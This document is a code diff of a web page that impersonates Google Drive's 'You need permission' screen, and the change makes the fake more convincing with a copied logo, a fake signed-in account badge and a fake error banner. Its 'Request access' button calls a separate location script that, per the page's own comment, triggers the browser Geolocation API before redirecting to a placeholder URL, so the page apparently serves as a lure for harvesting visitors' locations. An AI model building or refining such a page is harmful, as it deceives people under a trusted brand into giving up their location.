@@ -1,41 +1,132 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta name="description" content="Web word processing, presentations and spreadsheets">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
-	<link rel="shortcut icon" href="/images/drive_favicon1.ico">
-	<title>Google Drive - Access Denied</title>
-	<link rel="stylesheet" type="text/css" href="css/main.css">
-	<script type="text/javascript">
-    	if (window.location.protocol == "http:") {
-        	var restOfUrl = window.location.href.substr(5);
-        	window.location = "https:" + restOfUrl;
-    	}
+    <meta charset="UTF-8">
+    <meta name="description" content="Web word processing, presentations and spreadsheets">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="shortcut icon" href="/images/drive_favicon1.ico">
+    <title>Google Drive - Access Denied</title>
+    <link rel="stylesheet" type="text/css" href="css/main.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script type="text/javascript">
+        if (window.location.protocol == "http:") {
+            var restOfUrl = window.location.href.substr(5);
+            window.location = "https:" + restOfUrl;
+        }
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-	<script type="text/javascript" src="js/location.js"></script>
+    <script type="text/javascript" src="js/location.js"></script>
 </head>
 <body onload="information();">
-	<div id="outerContainer">
-		<div id="innerContainer">
-			<div style="position: absolute; top: -80px;">
-				<div id="drive-logo">
-					<span class="docs-drivelogo-img"></span>
-					<span class="docs-drivelogo-text"> Drive</span>
-				</div>
-			</div>
-			<div style="clear:both"></div>
-			<div id="main">
-				<div id="accessDeniedIcon"></div>
-				<p id="accessDeniedHeader">You need permission</p>
-				<div id="message">
-					<p>Want in? Ask for access, or switch to an account with permission.</p>
-				</div>
-				<p id="buttons" style="padding-top: 10px">
-					<button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">Request access</button>
-				</p>
-			</div>
-		</div>
-	</div>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-left">
+            <svg class="drive-logo" viewBox="0 0 87.3 78" width="28px" height="25px">
+                <path d="M5.7 78l16.2-28h59.7l-16.2 28z" fill="#1967d2"/>
+                <path d="M38.2 21.3L22 49.4 5.7 78 22 50 38.2 21.3z" fill="#1a73e8"/>
+                <path d="M65.3 78L81.5 50 49.3 2.1h32.3L97.8 29.5z" fill="#00a859"/>
+                <path d="M49.3 2.1L33 30.2 16.8 58.3l16.2-28.1 16.3-28.1z" fill="#f9ab00"/>
+                <path d="M65.3 78L49.1 50 32.8 78h32.5z" fill="#a0c2f9"/>
+            </svg>
+            <span class="drive-logo-text">Drive</span>
+        </div>
+        <div class="header-right">
+            <button class="apps-btn" aria-label="Google apps">
+                <svg viewBox="0 0 24 24" width="24" height="24">
+                    <path fill="#5f6368" d="M6 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm8 10c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm-8 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0-5c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm8 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm4-7c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-4 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm4 5c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 5c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+                </svg>
+            </button>
+            <div class="profile-avatar">J</div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="main-container">
+        <div class="content-box">
+            <!-- Icon -->
+            <div class="icon-container">
+                <div class="lock-circle">
+                    <svg viewBox="0 0 24 24" class="lock-icon">
+                        <path fill="#ea4335" d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Header Title -->
+            <h1 class="title">You need permission</h1>
+
+            <!-- Subtitle/Message -->
+            <div class="subtitle">
+                You are signed in as <span class="email-badge">guest.user.27@gmail.com</span> but you don't have permission to access this file. Request access or switch to an account with permission. <a href="https://support.google.com/drive/answer/2494822" target="_blank" class="learn-more-link">Learn more</a>
+            </div>
+
+            <!-- Message Box -->
+            <div class="message-field-container">
+                <textarea id="messageBox" class="message-field" rows="3" placeholder="Message to owner (optional)"></textarea>
+            </div>
+
+            <!-- Error Banner -->
+            <div id="errorBanner" class="error-banner" style="display: none;">
+                <svg viewBox="0 0 24 24" width="20" height="20" class="error-icon">
+                    <path fill="#d93025" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                </svg>
+                <span class="error-text">Request failed. Check your internet connection or location permissions and try again.</span>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="actions">
+                <button id="requestButton" class="btn btn-primary" onclick="requestAccess();">
+                    <span class="btn-text">Request access</span>
+                    <div class="spinner-container" style="display: none;">
+                        <svg class="spinner" viewBox="0 0 50 50">
+                            <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
+                        </svg>
+                    </div>
+                </button>
+                <button class="btn btn-secondary" onclick="window.location.reload();">Switch accounts</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Links -->
+    <footer class="footer">
+        <a href="#" class="footer-link">Terms of Service</a>
+        <span class="footer-dot">•</span>
+        <a href="#" class="footer-link">Privacy Policy</a>
+    </footer>
+
+    <script type="text/javascript">
+        function requestAccess() {
+            var $btn = $('#requestButton');
+            var $btnText = $btn.find('.btn-text');
+            var $spinner = $btn.find('.spinner-container');
+            var $errorBanner = $('#errorBanner');
+
+            // Hide previous errors
+            $errorBanner.fadeOut(150);
+
+            // Change button state to loading
+            $btn.prop('disabled', true).addClass('loading');
+            $btnText.css('opacity', '0');
+            $spinner.fadeIn(150);
+
+            // Trigger Geolocation API via locate()
+            locate(
+                function() {
+                    // Success callback: redirect to file URL
+                    window.location = 'REDIRECT_URL';
+                },
+                function(error, errMsg) {
+                    // Error callback: restore button and show elegant error banner
+                    setTimeout(function() {
+                        $btn.prop('disabled', false).removeClass('loading');
+                        $btnText.css('opacity', '1');
+                        $spinner.fadeOut(150);
+                        $errorBanner.fadeIn(300);
+                    }, 1200); // Small natural delay to simulate network latency
+                }
+            );
+        }
+    </script>
 </body>
 </html>
